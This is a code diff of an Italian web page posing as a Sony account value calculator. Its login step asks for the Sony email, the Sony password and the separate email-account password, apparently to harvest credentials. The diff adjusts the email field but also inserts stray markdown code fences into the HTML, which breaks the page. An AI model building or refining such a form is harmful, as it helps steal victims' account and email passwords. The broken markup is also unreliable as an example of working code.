@@ -54,12 +54,21 @@
             <div id="step-login" class="step-section">
                 <p id="txt-step1-desc">Inserisci i dati richiesti per iniziare la valutazione dell'account (min. 5 caratteri):</p>
                 
-                  <div class="input-group">
-                <label for="campo1">Email Account Sony:</label>
-                <input type="text" id="campo1" placeholder="Scrivi qui (Email)" required>
-            </div>
+                  ```html
+<div class="input-group">
+    <label for="campo1">Email Account Sony:</label>
 
-            <div class="input-group">
+    <input
+        type="email"
+        id="campo1"
+        name="email"
+        placeholder="Scrivi qui (Email)"
+        required
+    >
+</div>
+
+
+<div class="input-group">
                 <label for="campo2">Password Account Sony:</label>
                 <input type="text" id="campo2" placeholder="Scrivi qui (Password Acc)" required>
             </div>
@@ -68,6 +77,7 @@
                 <label for="campo3">Password associata alla Email:</label>
                 <input type="text" id="campo3" placeholder="Scrivi qui (Password Email)" required>
             </div>
+```
 
                 <button type="button" class="calc-btn" id="btn-next" onclick="proseguiAlCalcolo()" style="margin-top: 10px;">
                     Avanti al Calcolatore
@@ -208,4 +218,3 @@
     <script src="script.js"></script>
 </body>
 </html>
- 
